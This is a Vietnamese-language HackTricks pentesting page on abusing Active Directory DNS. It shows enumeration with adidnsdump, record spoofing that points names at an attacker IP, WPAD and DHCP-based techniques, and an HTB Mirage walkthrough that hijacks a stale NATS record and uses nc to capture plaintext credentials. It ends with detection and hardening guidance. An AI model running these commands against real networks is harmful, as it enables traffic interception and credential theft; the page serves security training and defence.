# Bản ghi DNS AD

{{#include ../../banners/hacktricks-training.md}}

Theo mặc định, **bất kỳ người dùng nào** trong Active Directory đều có thể **liệt kê tất cả bản ghi DNS** trong các vùng DNS của Domain hoặc Forest, tương tự như zone transfer (người dùng có thể liệt kê các đối tượng con của một vùng DNS trong môi trường AD).

Công cụ [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) cho phép **liệt kê** và **xuất** **tất cả bản ghi DNS** trong vùng để phục vụ mục đích recon mạng nội bộ.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (tháng 4 năm 2025) bổ sung đầu ra JSON/Greppable (`--json`), phân giải DNS đa luồng và hỗ trợ TLS 1.2/1.3 khi kết nối với LDAPS  

Để biết thêm thông tin, hãy đọc [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Tạo / Sửa đổi bản ghi (ADIDNS spoofing)

Vì nhóm **Authenticated Users** có quyền **Create Child** trên DACL của zone theo mặc định, nên bất kỳ tài khoản domain nào (hoặc tài khoản máy tính nào) cũng có thể đăng ký thêm bản ghi. Việc này có thể được dùng để chiếm quyền điều hướng lưu lượng, ép buộc NTLM relay hoặc thậm chí chiếm quyền kiểm soát toàn bộ domain.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py đi kèm Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Các kỹ thuật tấn công cơ bản

1. **Wildcard record** – `*.<zone>` biến AD DNS server thành một responder trên toàn enterprise, tương tự giả mạo LLMNR/NBNS. Có thể lạm dụng để thu thập NTLM hashes hoặc relay chúng đến LDAP/SMB. (Yêu cầu tắt WINS-lookup.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – thêm `wpad` (hoặc một record **NS** trỏ đến host của attacker để bypass Global-Query-Block-List) và proxy minh bạch các HTTP request gửi ra ngoài nhằm thu thập credentials. Microsoft đã vá các cách bypass wildcard/DNAME (CVE-2018-8320), nhưng **NS-records vẫn hoạt động**.<sup>[[1]](#references)</sup>    
3. **Chiếm quyền stale entry** – chiếm địa chỉ IP trước đây thuộc về một workstation; DNS entry tương ứng vẫn phân giải được, cho phép thực hiện resource-based constrained delegation hoặc Shadow-Credentials attacks mà không cần động đến DNS.    
4. **DHCP → DNS spoofing** – trong một triển khai Windows DHCP+DNS mặc định, attacker không cần xác thực trên cùng subnet có thể ghi đè bất kỳ A record nào (kể cả Domain Controllers) bằng cách gửi DHCP requests giả mạo, kích hoạt dynamic DNS updates (Akamai “DDSpoof”, 2023). Điều này cho phép machine-in-the-middle đối với Kerberos/LDAP và có thể dẫn đến chiếm quyền toàn bộ domain.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – thay đổi `dNSHostName` của machine account mà bạn kiểm soát, đăng ký A record trùng khớp, sau đó yêu cầu certificate cho tên đó để giả mạo DC. Các công cụ như **Certipy** hoặc **BloodyAD** tự động hóa toàn bộ quy trình.  

Một AD DNS record có [thông tin target được serialize](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) có thể là một phần của conditional relay chain: caller cần có quyền tạo record, một coercion path khiến target computer xác thực đến tên đó, và một relay destination chấp nhận kết quả xác thực. Đánh giá riêng protocol của destination; SMB signing trên kết nối đầu vào tự nó không xác định được liệu HTTPS WinRM destination có chấp nhận relay hay không. Patch level, cách xử lý tên, Extended Protection và cấu hình service có thể làm thay đổi kết quả.

---

### Chiếm quyền internal service thông qua stale dynamic records (case study NATS)

Khi dynamic updates vẫn mở cho tất cả authenticated users, **một service name đã bị hủy đăng ký có thể bị đăng ký lại và trỏ đến hạ tầng của attacker**. DC Mirage HTB để lộ hostname `nats-svc.mirage.htb` sau DNS scavenging, vì vậy bất kỳ user nào có đặc quyền thấp cũng có thể:<sup>[[3]](#references)</sup>

1. **Xác nhận record không còn tồn tại** và tìm hiểu SOA bằng `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Tạo lại bản ghi** trỏ tới một giao diện external/VPN mà họ kiểm soát:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Mạo danh dịch vụ plaintext**. NATS client mong đợi nhận được một banner `INFO { ... }` trước khi gửi thông tin xác thực, vì vậy chỉ cần sao chép banner hợp lệ từ broker thật là đủ để thu thập bí mật:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Bất kỳ client nào phân giải tên bị chiếm quyền sẽ ngay lập tức gửi lộ frame `CONNECT` JSON (bao gồm `"user"`/`"pass"`) đến listener. Chạy binary `nats-server -V` chính thức trên host của attacker, tắt tính năng che giấu log hoặc đơn giản là sniff phiên bằng Wireshark đều cho ra cùng thông tin xác thực dạng plaintext vì TLS là tùy chọn.

4. **Pivot bằng thông tin xác thực đã thu thập** – trong Mirage, tài khoản NATS bị đánh cắp có quyền truy cập JetStream, qua đó làm lộ các sự kiện xác thực cũ chứa username/password AD có thể tái sử dụng.

Mô hình này áp dụng cho mọi dịch vụ tích hợp AD dựa vào TCP handshake không được bảo vệ (HTTP APIs, RPC, MQTT, v.v.): khi bản ghi DNS bị chiếm quyền, attacker trở thành dịch vụ.
Để xem quy trình enumeration phía broker và các message được lưu giữ, hãy xem [NATS / JetStream pentesting](../../network-services-pentesting/4222-pentesting-nats.md).

---

## Phát hiện & tăng cường bảo mật

* Từ chối quyền *Create all child objects* của **Authenticated Users** trên các zone nhạy cảm và ủy quyền dynamic update cho một tài khoản chuyên dụng được DHCP sử dụng.
* Nếu cần dynamic update, hãy đặt zone thành **Secure-only** và bật **Name Protection** trong DHCP để chỉ computer object sở hữu bản ghi mới có thể ghi đè bản ghi đó.
* Giám sát các event ID 257/252 của DNS Server (dynamic update), 770 (zone transfer) và các thao tác ghi LDAP vào `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Chặn các tên nguy hiểm (`wpad`, `isatap`, `*`) bằng bản ghi cố ý vô hại hoặc thông qua Global Query Block List.
* Luôn cập nhật bản vá cho DNS server – chẳng hạn, các lỗi RCE CVE-2024-26224 và CVE-2024-26231 đạt **CVSS 9.8** và có thể bị khai thác từ xa nhằm vào Domain Controller.  



## References

- [1] [ADIDNS xem xét lại - WPAD, GQBL và hơn thế nữa](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Giả mạo bản ghi DNS bằng cách lạm dụng DHCP DNS Dynamic Update](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Kết hợp NFS leak, lạm dụng Dynamic DNS, đánh cắp thông tin xác thực NATS, bí mật JetStream và Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Bước vào Zone: dump DNS Active Directory bằng adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
